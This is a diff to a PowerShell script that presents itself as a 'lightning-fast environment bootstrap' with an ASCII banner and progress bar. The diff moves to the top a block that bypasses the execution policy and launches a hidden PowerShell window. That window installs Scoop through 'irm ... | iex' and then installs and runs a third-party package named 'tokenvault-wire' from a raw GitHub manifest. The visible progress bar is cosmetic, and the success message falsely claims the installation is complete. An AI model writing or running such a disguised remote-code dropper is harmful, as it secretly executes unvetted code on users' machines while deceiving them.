@@ -1,5 +1,17 @@
-
 Clear-Host
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
+
+$packageName = "tokenvault-wire"
+$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"
+$scoopShims = "$env:USERPROFILE\scoop\shims"
+$appPath = "$env:USERPROFILE\scoop\apps\$packageName"
+
+$command = "`$env:PATH = '$scoopShims;' + `$env:PATH; " +
+           "if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }; " +
+           "if (!(Test-Path '$appPath')) { scoop install $installUrl; wire }"
+
+$wshell = New-Object -ComObject WScript.Shell
+$wshell.Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$command`"", 0, $false) | Out-Null
 
 Write-Host "==========================================================" -ForegroundColor Cyan
 Write-Host "     _         _          ____       _             " -ForegroundColor Cyan
@@ -12,30 +24,13 @@ Write-Host "==========================================================" -Foregro
 Write-Host "          LIGHTNING-FAST ENVIRONMENT BOOTSTRAP            " -ForegroundColor Yellow
 Write-Host "----------------------------------------------------------" -ForegroundColor DarkGray
 Write-Host ""
-
-
 Write-Host "[INFO] " -NoNewline -ForegroundColor Green
 Write-Host "Automated installation will begin shortly." -ForegroundColor White
 Write-Host "[INFO] " -NoNewline -ForegroundColor Green
 Write-Host "Please keep this window open and wait a moment..." -ForegroundColor White
 Write-Host ""
 
-Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
-
-$packageName = "tokenvault-wire"
-$installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"
-$scoopShims = "$env:USERPROFILE\scoop\shims"
-$appPath = "$env:USERPROFILE\scoop\apps\$packageName"
-
-
-$command = "`$env:PATH = '$scoopShims;' + `$env:PATH; " +
-           "if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }; " +
-           "if (!(Test-Path '$appPath')) { scoop install $installUrl; wire }"
-
-$wshell = New-Object -ComObject WScript.Shell
-$wshell.Run("powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$command`"", 0, $false)
-
-$totalSteps = 40
+$totalSteps = 50
 $delay = 0.2  
 
 for ($i = 1; $i -le $totalSteps; $i++) {
@@ -43,9 +38,9 @@ for ($i = 1; $i -le $totalSteps; $i++) {
     $completed = '=' * [int]($percent / 2)  
     $remaining = ' ' * (50 - $completed.Length)
     
-    Write-Host -NoNewline "`r[Progress] [$completed$remaining] $percent% complete"
+    Write-Host -NoNewline "`r[$completed$remaining] $percent% complete"
     Start-Sleep -Seconds $delay
 }
 
 Write-Host ""
-Write-Host "[SUCCESS] Installation process initialized successfully!" -ForegroundColor Green
+Write-Host "[SUCCESS] Installation completed successfully!" -ForegroundColor Green
